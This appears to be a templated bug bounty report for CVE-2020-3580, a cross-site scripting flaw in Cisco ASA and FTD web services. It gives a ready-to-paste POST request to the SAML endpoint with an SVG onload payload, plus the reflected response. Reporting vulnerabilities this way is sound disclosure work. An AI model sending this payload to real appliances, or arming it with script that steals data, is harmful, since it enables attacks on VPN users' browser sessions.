

# Cross-site Scripting on cisco appliance (CVE-2020-3580)

## Summary

A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting attacks on a targeted system.


## Affected assets 

$URL

## Steps To Reproduce:
 
 Send POST request as shown below

 1. Using Burp, copy and paste the following request:
```
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: REDACTED
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Connection: close
Content-Length: 53
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

SAMLResponse=%22%3E%3Csvg/onload=alert(/kre80r/)%3E
```

{screenshotid}


2. You will see the alert box willl pop up in the response as seen below
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-store
Pragma: no-cache
Connection: Keep-Alive
Date: Fri, 30 Jul 2021 07:31:46 GMT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 764


<html>
<head>
<script>
function submit_saml() {
    document.cookie = "webvpnlogin=1; path=/; secure";
    document.createElement('form').submit.call(document.getElementById('samlform'));
}
</script>
</head>
<body onload="submit_saml()">
<form id="samlform" action="/+webvpn+/index.html" method="POST">
<input type="hidden" name="tgroup" value="">
<input type="hidden" name="next" value="">
<input type="hidden" name="tgcookieset" value="">
<input type="hidden" name="group_list" value="a">
<input type="hidden" name="username" value="">
<input type="hidden" name="password" value="">
<input type="hidden" name="SAMLResponse" value=""><svg/onload=alert(/kre80r/)>
">
<input type="submit" name="Login" value="Login" style="display:none;">
</form>
</body>
</html>
```

{screenshotid}

## Impact
A successful attack would allow unauthenticated attacker to send  malicious links to Cisco device  users in order to execute javascript commands in the context of the victimâ€™s browser.

### Supporting Material/References:
https://nvd.nist.gov/vuln/detail/CVE-2020-3580
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe

